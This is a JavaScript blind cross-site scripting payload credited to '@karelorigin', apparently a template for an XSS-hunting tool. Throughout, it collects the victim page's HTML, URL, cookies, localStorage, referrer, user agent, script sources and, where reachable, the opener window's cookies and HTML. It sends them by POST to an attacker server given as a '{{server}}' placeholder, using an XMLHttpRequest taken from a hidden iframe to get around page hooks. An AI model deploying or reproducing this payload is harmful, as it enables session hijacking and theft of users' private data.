// Written by: @karelorigin
(function(){
    if(window.name != "infected") {
        server = "{{server}}"
    
        var reset = function reset(constructor) {
            if (!(constructor.name in reset)) {
                iframe = document.createElement('iframe');
                iframe.src = 'about:blank';
                iframe.style.display = 'none';
                document.body.appendChild(iframe);
                reset[constructor.name] = iframe.contentWindow[constructor.name];
            } return reset[constructor.name];
        }
        
        newxmlhttprequest = reset(XMLHttpRequest)
        xhr = new newxmlhttprequest
        xhr.open("POST", server)
    
        encode = encodeURIComponent
    
        innerHTML = document.getElementsByTagName("html")[0].innerHTML
        href = location.href
        cookies = document.cookie
        openerlocation = null
        openercookies = null
        openerhtml = null
        localstorage = JSON.stringify(localStorage)
        referrer = document.referrer
        user_agent = navigator.userAgent
    
    
        if(opener) {
            try {
                openerlocation = opener.location.href
                openercookies = opener.document.cookie
                openerhtml = opener.document.getElementsByTagName("html").innerHTML
            } catch(e) {}
        }
    
        urls = []
    
        document.querySelectorAll("script[src]").forEach(function(elem){
                    urls.push(elem.src)
        })
    
        urls = urls.toString()
    
        query = ""
        query += "inne=" + encode(innerHTML) + "&"
        query += "durl=" + encode(href) + "&"
        query += "dcoo=" + encode(cookies) + "&"
        query += "oloc=" + encode(openerlocation) + "&"
        query += "odoc=" + encode(openercookies) + "&"
        query += "oloh=" + encode(openerhtml) + "&"
        query += "locs=" + encode(localstorage) + "&"
        query += "jsurls=" + encode(urls) + "&"
        query += "referrer=" + encode(referrer) + "&"
        query += "useragent=" + encode(user_agent)
    
        xhr.onreadystatechange = function(){
            document.body.removeChild(iframe)
        }
    
        xhr.send(query)
    }

    window.name = "infected"
})()